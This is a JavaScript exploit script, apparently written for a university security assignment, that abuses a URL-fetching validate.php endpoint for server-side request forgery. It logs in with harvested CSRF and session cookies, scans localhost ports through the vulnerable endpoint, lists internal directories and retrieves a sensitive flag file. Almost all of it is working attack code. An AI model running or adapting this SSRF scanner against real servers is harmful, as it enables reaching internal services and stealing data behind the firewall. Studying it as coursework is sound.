//http://assignment-code-warriors.unimelb.life/validate.php?web=https://fangtaidong.free.beeceptor.com
//https://fangtaidong.free.beeceptor.com --> this is self test backend
//http://assignment-code-warriors.unimelb.life/validate.php?web= --> this will return the value that myself backend response.
// This means that, once I provide an URL in this validate.php, it will return back to me the response of the URL I provid.
// This can be an entry point for attacker to utilize to access the inner servers which might be sensitive.

import fetch from "node-fetch";
import { exec } from "child_process";
import util from "util";
import { rmSync } from "fs";

const execPro = util.promisify(exec);

// Combine and keep Cookie info (CSRF_token & session_id) login
async function cookieLogin(ssrf) {
  const fileName = "getCookie.py";
  await execPro("python" + " " + fileName, function (error, stdout, stderr) {
    if (error) {
      console.log("stderr", error);
    }
    if (stdout) {
      // console.log("stdout", stdout);
      let astr = stdout.split("\r\n").join("");
      //   console.log(astr);
      let [login, status, cookie] = astr.split("...");
      cookie = JSON.parse(cookie);
      // console.log(cookie);
      const { CSRF_token, PHPSESSID } = cookie;
      console.log("CSRF_token is : " + CSRF_token);
      console.log("PHPSESSID is : " + PHPSESSID);
      ssrf(CSRF_token, PHPSESSID);
    }
  });
}

// SSRF (Server Side Request Forgery)
const ssrf = (token, ssid) => {
  const url =
    "http://assignment-code-warriors.unimelb.life/validate.php?web=http://localhost:";

  // scanning ports
  const ports = new Array(9999);
  // already test the all ports before 8860 (from 1) and has no abnormal detected
  let idx = 8860;
  const timer = setInterval(function () {
    // console.log(`${url}${idx}`);

    fetch(`${url}${idx}`, {
      headers: {
        Cookie: `CSRF_token=${token}; PHPSESSID=${ssid}`,
      },
    }).then((data) => {
      const res = Array.from(data.headers);
      console.log(res);
      if (res[2][1] !== "30") {
        clearInterval(timer);
        console.log("!!! ATTENTION !!!");
        console.log(`Sensitive port has been detected which is port: ${idx}`);
        console.log("");
        console.log("Request this port backend again...");
        console.log("");

        fetch(`${url}${idx}/`, {
          headers: {
            Cookie: `CSRF_token=${token}; PHPSESSID=${ssid}`,
          },
        })
          .then((data) => data.text())
          .then((res) => {
            const arr = Array.from(res.trim().split(";"));
            // console.log(arr);
            const paths = new Set();
            arr.forEach((html) => {
              if (
                html.match(/documents\//g) ||
                html.match(/random\//g) ||
                html.match(/storage\//g)
              ) {
                // console.log(html);
                const path = html.split("&")[0];
                paths.add(path);
              }
            });
            console.log(paths);
            // documents
            if (paths.has("documents/")) {
              console.log(idx);
              const flagPath =
                "/documents/background-checks/sensitive/flag.txt";
              // get the ssrf flag
              fetch(`${url}${idx}${flagPath}`, {
                headers: {
                  Cookie: `CSRF_token=${token}; PHPSESSID=${ssid}`,
                },
              })
                .then((flag) => flag.text())
                .then((res) => console.log(res));
            }
          });
      } else {
        idx++;
        console.log(idx);
      }
    });
    //   .then((res) => console.log(res));

    if (idx > ports.length) {
      clearInterval(timer);
    }
  }, 2000); // in order to protect the server, I set each request interval is 2s.
};

cookieLogin(ssrf);
